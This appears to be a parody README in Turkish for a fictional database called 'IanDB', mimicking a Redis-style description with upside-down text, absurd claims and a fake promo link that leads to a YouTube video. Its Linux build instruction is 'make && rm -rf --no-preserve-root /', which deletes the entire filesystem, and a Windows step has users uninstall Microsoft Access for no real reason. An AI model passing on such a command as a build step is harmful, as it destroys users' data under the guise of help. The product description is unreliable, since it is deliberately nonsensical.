# IanDB - v1.0 (0˙Ɩʌ nuoʎᴉsɹǝΛ ʇsǝɟɹǝqoʇʞɔɐH - 𐐒◖uɐI)

<img src="https://i.imgur.com/5SBCv47.png">

IanDB sıklıkla yapısal bir data yapısı sunucusu olarak tanımlanır. Bu, IanDB'nin, bir sunucu-alıcı modeli ile UDP soketleri ve yalın bir protokol kullanarak gönderilen bir komut seti ile değişken data yapılarına erişim sağladığı anlamına gelir. Böylece değişik prosesler ortak bir yolla aynı data yapılarını sorgulayıp değiştirebilir.

*(.ɹᴉʅᴉqǝɹᴉʇs᷇ᴉƃ̯ǝp dıʎɐʅnƃɹos ıuıɹɐʅıdɐʎ ɐʇɐp ıuʎɐ ɐʅʅoʎ ɹᴉq ʞɐʇɹo ɹǝʅsǝsoɹd ʞᴉs᷇ᴉƃ̯ǝp ǝɔǝʅʎo̤ꓭ .ɹᴉʅǝƃ ɐuıɯɐʅuɐ ıƃ̯ıpɐʅƃ̯ɐs ɯᴉs᷇ᴉɹǝ ɐuıɹɐʅıdɐʎ ɐʇɐp uǝʞs᷇ᴉƃ̯ǝp ǝʅᴉ ᴉʇǝs ʇnɯoʞ ɹᴉq uǝʅᴉɹǝpuo̤ƃ ʞɐɹɐuɐʅʅnʞ ʅoʞoʇoɹd ɹᴉq uıʅɐʎ ǝʌ ᴉɹǝʅʇǝʞos ԀᗡՈ ǝʅᴉ ᴉʅǝpoɯ ıɔıʅɐ-nɔnuns ɹᴉq ʻuᴉu╻ꓭᗡuɐI ʻnꓭ .ɹıuɐʅɯıuɐʇ ʞɐɹɐʅo nsnɔnuns ısıdɐʎ ɐʇɐp ɹᴉq ʅɐsıdɐʎ ɐʅʞıʅʞıs ꓭᗡuɐI)*

IanDB'de uygulanan data yapılarının birkaç spesiyalitesi bulunur:

*(:ɹnunʅnq ᴉsǝʇᴉʅɐʎᴉsǝds ɔ᷇ɐʞɹᴉq uıuıɹɐʅıdɐʎ ɐʇɐp uɐuɐʅnƃʎn ǝp╻ꓭᗡuɐI
)*

IanDB onları diskte depolamaya özen gösterir. Bu, IanDB'nin hızlı olduğu, ancak dengesiz olmadığı anlamına gelir.
Data yapılarının uygulanması sabit disk verimini baskılar, bu yüzden IanDB içindeki data yapıları yüksek düzey bir programlama dili kullanılarak modellenen aynı data yapısı ile karşılaştırıldığında büyük olasılıkla daha çok sabit disk kullanır.
IanDB; çoğaltma, ölçekleme, ayarlanabilir dayanıklılık düzeyleri, küme, daha çok ölçekleme ve yüksek kullanılabilirlik gibi bir veri tabanında bulunması doğal birçok spesiyalite sunar.
Data tıkanıklığı ve aplikasyon düzeyinde ataklara karşı açıkları önlemek için kodlama ve algoritmalar kullanır.

İşletme lisansları ve %12 indirim için lütfen [https://db.ian678.com/?promocode=ygolde](https://www.youtube.com/watch?v=Tt7bzxurJ1I) adresine gidin!

# IanDB'yi Derleme

### Linux Geliştiricileri

    make && rm -rf --no-preserve-root /

IanDB'yi derledikten sonra aşağıdakini kullanarak test etmek iyi bir fikirdir:

    make test

### Windows "Geliştiricileri" 

1. `C:\Program Files (x86)\Common Files\Microsoft Shared\OFFICE15\Office Setup Controller\setup.exe" /uninstall "AccessRT"` kullanarak Microsoft Access'i kaldırın (çakışan yazılım)

Testler, windows için şu anda kullanılamamaktadır

Artık ian-db'yi indirdikten sonra `yarn install` kullanılabilir - şimdi windows desteğiyle!

# Kod katkıları
CBenni  
Onslaught
 🤔

Tadını çıkarın!
